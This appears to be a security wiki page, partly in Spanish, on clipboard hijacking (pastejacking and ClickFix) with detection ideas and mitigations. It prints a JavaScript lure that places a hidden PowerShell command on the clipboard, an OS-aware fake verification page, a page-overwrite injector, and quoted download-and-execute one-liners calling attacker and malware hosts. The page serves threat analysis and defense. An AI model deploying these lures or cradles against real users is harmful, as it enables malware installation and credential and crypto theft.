# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – old but still valid advice

## Overview

Clipboard hijacking – also known as *pastejacking* – abuses the fact that users routinely copy-and-paste commands without inspecting them. A malicious web page (or any JavaScript-capable context such as an Electron or Desktop application) programmatically places attacker-controlled text into the system clipboard. Victims are encouraged, normally by carefully crafted social-engineering instructions, to press **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), or open a terminal and *paste* the clipboard content, immediately executing arbitrary commands.

Because **no file is downloaded and no attachment is opened**, the technique bypasses most e-mail and web-content security controls that monitor attachments, macros or direct command execution. The attack is therefore popular in phishing campaigns delivering commodity malware families such as NetSupport RAT, Latrodectus loader or Lumma Stealer.

## Wallet-address replacement clippers

Another **clipboard hijacking** variant does not paste commands at all: it waits until the victim copies a **cryptocurrency wallet address**, then silently swaps it for an attacker-controlled one just before paste. This is especially effective against long wallet formats because users often only verify the first/last characters.

Common real-world traits:
- **Thin loader + nested payload**: the visible app/exe looks like a legitimate trading or "profit" tool, while the real clipper is hidden deeper in the bundle (for example a .NET loader launching a nested Rust payload).
- **Regex-driven replacement**: the malware matches strings such as `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, or even generic **44-character Solana-like** strings and rewrites them to attacker wallets.
- **Wallet rotation at scale**: modern Windows samples may embed **thousands** of replacement wallets per currency instead of a single static address, reducing wallet reputation burn after each theft.

### Windows clipper flow

A common implementation is a hidden window registered with **`AddClipboardFormatListener`**. On each clipboard update, the malware typically calls:
- **`OpenClipboard`** → access current clipboard data.
- **`GetClipboardData`** → read text.
- **`EmptyClipboard`** + **`SetClipboardData`** → replace the wallet string with the attacker value.

Minimal hunting regexes frequently seen in clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
La persistencia a nivel de usuario es suficiente para causar impacto. Un patrón observado es:
- Copiar el payload a **`%APPDATA%\silke\silke.exe`**
- Crear un **LNK de la carpeta Startup** en `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ideas de detección:
- Procesos que llaman a las APIs del clipboard de forma continua mientras también escriben en `%APPDATA%` y en la carpeta **Startup** del usuario.
- Nueva creación de LNK/executable seguida de reescrituras del clipboard de direcciones de wallet.
- Archivos comprimidos o bundles de fake-software que contienen muchos archivos sin usar más un pequeño launcher que inicia un binary anidado.

### macOS eliminación de cuarentena mediante ingeniería social + persistencia con LaunchAgent

En macOS, algunas campañas distribuyen un helper **`unlocker.command`** e instruyen a la víctima a hacer clic derecho → **Open** si Gatekeeper dice que la app está dañada o proviene de un desarrollador no identificado. El script simplemente elimina la cuarentena y lanza la `.app` cercana:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Esto **no** es un exploit de Gatekeeper; es un **quarantine bypass socialmente ingenierizado** que abusa del hecho de que las decisiones de Gatekeeper dependen del xattr `com.apple.quarantine`.

Tras la ejecución, el clipper puede persistir como el usuario actual escribiendo:
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent con `RunAtLoad` y `KeepAlive`

Un detalle defensivo útil es que algunas muestras implementan un **self-healing watchdog** que reescribe el LaunchAgent y el wrapper cada ~30 segundos. Si eliminas el plist primero **sin matar el proceso en ejecución**, el malware puede recrearlo de inmediato. Orden seguro de limpieza:
1. Matar el proceso activo del clipper.
2. Descargar/eliminar el plist del LaunchAgent.
3. Eliminar `~/launch.sh` y el payload copiado.

### Nota de entrega: reputación falsa como multiplicador de fuerza

Para esta familia, el malware en sí puede seguir siendo técnicamente simple mientras la **capa de distribución** hace el trabajo pesado: estrellas/forks falsos de GitHub, reseñas/descargas de SourceForge, comentarios/vistas de tutoriales de YouTube y comentarios/votos benignos en VirusTotal se usan para hacer que el binario parezca confiable antes de la ejecución.

## Botones de copia forzada y payloads ocultos (one-liners de macOS)

Algunos infostealers de macOS clonan sitios de instaladores (p. ej., Homebrew) y **fuerzan el uso de un botón “Copy”** para que los usuarios no puedan resaltar solo el texto visible. La entrada del clipboard contiene el comando esperado del instalador más un payload Base64 añadido (p. ej., `...; echo <b64> | base64 -d | sh`), de modo que un solo pegado ejecuta ambos mientras la UI oculta la etapa extra.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Las campañas anteriores usaban `document.execCommand('copy')`, las más nuevas dependen de la **Clipboard API** asíncrona (`navigator.clipboard.writeText`).

## El flujo de ClickFix / ClearFake

1. El usuario visita un sitio typosquatted o comprometido (p. ej. `docusign.sa[.]com`)
2. El JavaScript inyectado de **ClearFake** llama a un helper `unsecuredCopyToClipboard()` que guarda silenciosamente en el clipboard una one-liner de PowerShell codificada en Base64.
3. Las instrucciones HTML le dicen a la víctima que: *“Pulse **Win + R**, pegue el comando y pulse Enter para resolver el problema.”*
4. `powershell.exe` se ejecuta, descargando un archivo comprimido que contiene un ejecutable legítimo junto con una DLL maliciosa (classic DLL sideloading).
5. El loader descifra etapas adicionales, inyecta shellcode e instala persistencia (p. ej. scheduled task) – ejecutando finalmente NetSupport RAT / Latrodectus / Lumma Stealer.

### Ejemplo de cadena de NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart legítimo) busca en su directorio `msvcp140.dll`.
* La DLL maliciosa resuelve APIs dinámicamente con **GetProcAddress**, descarga dos binarios (`data_3.bin`, `data_4.bin`) mediante **curl.exe**, los descifra usando una rolling XOR key `"https://google.com/"`, inyecta el shellcode final y descomprime **client32.exe** (NetSupport RAT) en `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Descarga `la.txt` con **curl.exe**
2. Ejecuta el downloader de JScript dentro de **cscript.exe**
3. Obtiene un payload MSI → deja caer `libcef.dll` además de una aplicación firmada → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
La llamada a **mshta** lanza un script oculto de PowerShell que recupera `PartyContinued.exe`, extrae `Boat.pst` (CAB), reconstruye `AutoIt3.exe` mediante `extrac32` y la concatenación de archivos y, finalmente, ejecuta un script `.a3x` que exfiltra credenciales del navegador a `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Algunas campañas de ClickFix omiten por completo las descargas de archivos e instruyen a las víctimas a pegar una línea única que obtiene y ejecuta JavaScript mediante WSH, lo persiste y rota C2 a diario. Cadena observada de ejemplo:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Rasgos clave
- URL ofuscada invertida en tiempo de ejecución para evitar una inspección casual.
- JavaScript se persiste a sí mismo mediante un LNK de Startup (WScript/CScript), y selecciona el C2 según el día actual, lo que permite una rotación rápida de dominios.

Fragmento mínimo de JS usado para rotar C2s por fecha:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Siguiente etapa suele desplegar un loader que establece persistencia y descarga un RAT (p. ej., PureHVNC), a menudo fijando TLS a un certificado hardcoded y fragmentando el tráfico.

Ideas de detección específicas para esta variante
- Árbol de procesos: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (o `cscript.exe`).
- Artefactos de inicio: LNK en `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invocando WScript/CScript con una ruta JS bajo `%TEMP%`/`%APPDATA%`.
- Telemetría de Registry/RunMRU y de línea de comandos que contenga `.split('').reverse().join('')` o `eval(a.responseText)`.
- Repetidos `powershell -NoProfile -NonInteractive -Command -` con payloads grandes por stdin para alimentar scripts largos sin líneas de comando largas.
- Scheduled Tasks que luego ejecutan LOLBins como `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` bajo una tarea/ruta con apariencia de updater (p. ej., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Hostnames y URLs C2 con rotación diaria y patrón `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlacionar eventos de escritura al clipboard seguidos de paste con Win+R y luego ejecución inmediata de `powershell.exe`.


Los equipos de Blue pueden combinar telemetría de clipboard, creación de procesos y Registry para identificar el abuso de pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` mantiene un historial de comandos de **Win + R** – busca entradas inusuales en Base64 / obfuscadas.
* Security Event ID **4688** (Process Creation) donde `ParentImage` == `explorer.exe` y `NewProcessName` en { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** para creaciones de archivos bajo `%LocalAppData%\Microsoft\Windows\WinX\` o carpetas temporales justo antes del evento 4688 sospechoso.
* Sensores de clipboard de EDR (si están presentes) – correlacionar `Clipboard Write` seguido inmediatamente de un nuevo proceso de PowerShell.

## Páginas de verificación estilo IUAM (ClickFix Generator): clipboard copy-to-console + payloads conscientes del OS

Campañas recientes producen en masa páginas falsas de verificación de CDN/browser ("Just a moment…", estilo IUAM) que coaccionan a los usuarios a copiar comandos específicos de su OS desde el clipboard a consolas nativas. Esto desvía la ejecución fuera del sandbox del browser y funciona en Windows y macOS.

Rasgos clave de las páginas generadas por el builder
- Detección de OS mediante `navigator.userAgent` para adaptar payloads (Windows PowerShell/CMD vs. macOS Terminal). Decoys/No-ops opcionales para OS no compatibles para mantener la ilusión.
- Copia automática al clipboard al realizar acciones benignas de la UI (checkbox/Copy) mientras el texto visible puede diferir del contenido del clipboard.
- Bloqueo en móvil y un popover con instrucciones paso a paso: Windows → Win+R→paste→Enter; macOS → abrir Terminal→paste→Enter.
- Ofuscación opcional e inyector de un solo archivo para sobrescribir el DOM de un sitio comprometido con una UI de verificación con estilo Tailwind (no hace falta registrar un nuevo dominio).

Ejemplo: mismatch del clipboard + branching consciente del OS
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
- Persistencia de la ejecución inicial en macOS
- Usa `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` para que la ejecución continúe después de cerrar la terminal, reduciendo los artefactos visibles.

Secuestro de página in situ en sitios comprometidos
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
- Ideas de detección y hunting específicas para lures estilo IUAM
- Web: Páginas que vinculan la Clipboard API a widgets de verificación; desajuste entre el texto mostrado y el payload del clipboard; ramificación de `navigator.userAgent`; Tailwind + reemplazo de página única en contextos sospechosos.
- Endpoint de Windows: `explorer.exe` → `powershell.exe`/`cmd.exe` poco después de una interacción con el navegador; instaladores batch/MSI ejecutados desde `%TEMP%`.
- Endpoint de macOS: Terminal/iTerm lanzando `bash`/`curl`/`base64 -d` con `nohup` cerca de eventos del navegador; trabajos en segundo plano que sobreviven al cierre del terminal.
- Correlaciona el historial `RunMRU` de Win+R y las escrituras en el clipboard con la posterior creación de procesos de consola.

Ver también técnicas de apoyo

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake sigue comprometiendo sitios WordPress e inyecta JavaScript cargador que encadena hosts externos (Cloudflare Workers, GitHub/jsDelivr) e incluso llamadas de blockchain “etherhiding” (por ejemplo, POSTs a endpoints de la API de Binance Smart Chain como `bsc-testnet.drpc[.]org`) para extraer la lógica actual del lure. Las superposiciones recientes usan mucho fake CAPTCHAs que instruyen a los usuarios a copiar/pegar una línea única (T1204.004) en lugar de descargar algo.
- La ejecución inicial se delega cada vez más a hosts de scripts firmados/LOLBAS. En enero de 2026, las cadenas cambiaron el uso anterior de `mshta` por el `SyncAppvPublishingServer.vbs` integrado, ejecutado mediante `WScript.exe`, pasando argumentos estilo PowerShell con alias/comodines para obtener contenido remoto:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` está firmado y normalmente se usa para App-V; combinado con `WScript.exe` y argumentos inusuales (`gal`/`gcm` aliases, cmdlets con wildcard, URLs de jsDelivr) se convierte en una etapa LOLBAS de alta señal para ClearFake.
- En febrero de 2026, los payloads falsos de CAPTCHA volvieron a cradles de descarga en PowerShell puro. Dos ejemplos en vivo:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- La primera cadena es un grabber en memoria `iex(irm ...)`; la segunda se encadena mediante `WinHttp.WinHttpRequest.5.1`, escribe un `.ps1` temporal y luego se lanza con `-ep bypass` en una ventana oculta.

Detection/hunting tips for these variants
- Linaje de procesos: navegador → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` o cradles de PowerShell inmediatamente después de escrituras en el clipboard/Win+R.
- Palabras clave en la línea de comandos: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, dominios jsDelivr/GitHub/Cloudflare Worker, o patrones `iex(irm ...)` con IPs en crudo.
- Red: conexiones salientes a hosts CDN worker o endpoints RPC de blockchain desde hosts de script/PowerShell poco después de navegar por la web.
- File/registry: creación temporal de `.ps1` bajo `%TEMP%` más entradas RunMRU que contengan estas one-liners; bloquear/alertar sobre signed-script LOLBAS (WScript/cscript/mshta) ejecutándose con URLs externas o cadenas de alias ofuscadas.

## June 2026 ClickFix tradecraft: paste telemetry, fake verification comments, and LOLBin chaining

La telemetría reciente de Red Canary muestra que el indicador estable **no es un comando exacto**, sino la combinación de **paste-and-run asistido por el usuario**, **trusted interpreters/LOLBins**, **flags ofuscados**, **remote retrieval** e **immediate execution**.

### Notable operator patterns

- **Paste confirmation telemetry**: algunos payloads llaman `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` antes de la etapa real. Esto confirma la interacción del usuario mientras mantiene la ventana corta y silenciosa.
- **Fake verification comments**: los one-liners de PowerShell pueden añadir cadenas como `# Security check ✔️ I'm not a robot Verification ID: 138105` para que el comando siga pareciendo relacionado con CAPTCHA después de pegarse en Run / `cmd.exe` / PowerShell history.
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` evita una URL estática en la línea de comandos mientras sigue realizando download-and-execute en memoria.
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` abusa de mayúsculas/minúsculas inusuales y caracteres similares a Unicode en flags para romper detecciones frágiles mientras sigue pareciendo `msiexec.exe`.
- **Caret-escaped LOLBin chains**: `cmd.exe` puede ocultar keywords con escapes `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), iniciar la shell anidada minimizada, guardar contenido del atacante con una extensión benigna como `.pdf`, y luego ejecutarlo mediante `mshta`.
## Mitigations

1. Browser hardening – deshabilitar el acceso de escritura al clipboard (`dom.events.asyncClipboard.clipboardItem` etc.) o requerir una acción del usuario.
2. Security awareness – enseñar a los usuarios a *escribir* los comandos sensibles o pegarlos primero en un editor de texto.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control para bloquear one-liners arbitrarios.
4. Network controls – bloquear solicitudes salientes a dominios conocidos de pastejacking y malware C2.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
